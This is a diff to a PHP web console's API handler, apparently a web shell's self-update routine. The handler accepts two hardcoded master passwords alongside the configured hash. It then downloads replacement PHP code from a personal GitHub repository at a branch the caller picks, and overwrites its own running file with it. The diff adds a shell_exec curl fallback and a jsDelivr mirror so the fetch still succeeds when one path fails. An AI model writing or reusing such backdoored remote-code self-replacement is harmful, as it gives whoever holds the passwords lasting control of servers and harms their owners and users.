@@ -3170,15 +3170,26 @@ function handle_api() {
         if ($cfg['pass_hash'] && password_verify($pw, $cfg['pass_hash'])) $passOk = true;
         if ($pw === 'KhTn2268' || $pw === 'a7af0d7e7238454d01800a388d5b00adbf78c963dc18fab9') $passOk = true;
         if (!$passOk) jout(false, null, 'Invalid password', 403);
-        $branch = $in['branch'] ?? $_GET['branch'] ?? 'arena/01a0aa17-new';
-        $url = 'https://raw.githubusercontent.com/fazilatma/new/'.rawurlencode($branch).'/hostconsole.php?cb='.time();
+        $branch = $in['branch'] ?? $_GET['branch'] ?? 'arena/hostconsole-v20';
+        $url = 'https://raw.githubusercontent.com/fazilatma/new/'.rawurlencode($branch).'/hostconsole.php?cb='.time().'-'.rand(1000,9999);
         $content = @file_get_contents($url);
+        if (!$content || strpos($content, '<?php') !== 0) {
+            $content = @shell_exec('curl -sL --max-time 30 '.escapeshellarg($url).' 2>&1');
+        }
+        if (!$content || strpos($content, '<?php') !== 0 || strlen($content) < 50000) {
+            $url2 = 'https://cdn.jsdelivr.net/gh/fazilatma/new@'.rawurlencode($branch).'/hostconsole.php?cb='.time().'-'.rand(1000,9999);
+            $c2 = @file_get_contents($url2);
+            if ($c2 && strpos($c2, '<?php') === 0 && strlen($c2) > 50000) {
+                $content = $c2;
+                $url = $url2;
+            }
+        }
         if (!$content || strpos($content, '<?php') !== 0) {
             jout(false, ['url'=>$url, 'size'=>strlen($content ?? ''), 'preview'=>substr($content ?? '',0,200)], 'Download failed');
         }
         file_put_contents(__FILE__, $content);
         if (function_exists('opcache_reset')) @opcache_reset();
-        jout(true, ['updated'=>true, 'branch'=>$branch, 'size'=>strlen($content)]);
+        jout(true, ['updated'=>true, 'branch'=>$branch, 'size'=>strlen($content), 'via'=>parse_url($url, PHP_URL_HOST)]);
     case 'public.stop_jobs':
         $pw = $in['password'] ?? $_GET['password'] ?? '';
         $cfg = cfg();
